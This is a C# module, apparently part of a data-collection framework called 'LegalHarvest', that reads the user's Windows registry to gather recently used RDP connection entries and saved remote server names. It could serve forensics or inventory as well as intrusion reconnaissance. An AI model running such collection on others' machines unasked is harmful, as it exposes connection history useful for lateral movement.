using Microsoft.Win32;
using System;
using System.Collections.Generic;

namespace LegalHarvest.Modules
{
    public class SavedRDPModule : ICollectorModule
    {
        public string ModuleName => "SavedRDP";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Terminal Server Client\Default"))
            {
                if (key != null)
                {
                    foreach (string valueName in key.GetValueNames())
                    {
                        if (valueName.StartsWith("MRU"))
                        {
                            string value = key.GetValue(valueName) as string;
                            if (!string.IsNullOrEmpty(value))
                                items.Add(new CollectedItem { Category = "SavedRDP", Name = valueName, Value = value, Timestamp = DateTime.Now });
                        }
                    }
                }
            }

            using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Terminal Server Client\Servers"))
            {
                if (key != null)
                    foreach (string serverName in key.GetSubKeyNames())
                        items.Add(new CollectedItem { Category = "SavedRDP", Name = "Server", Value = serverName, Timestamp = DateTime.Now });
            }
            return items;
        }
    }
}
